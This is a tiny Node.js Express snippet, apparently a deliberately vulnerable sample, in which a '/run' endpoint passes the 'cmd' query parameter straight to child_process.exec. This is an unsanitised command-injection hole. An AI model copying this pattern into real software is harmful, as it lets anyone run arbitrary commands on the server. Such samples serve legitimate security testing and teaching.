const express = require('express');
const cp = require('child_process');
const app = express();

function getCmd(req) {
  const v = req.query.cmd;
  return v;
}

app.get('/run', (req, res) => {
  cp.exec(getCmd(req));
  res.send('ok');
});
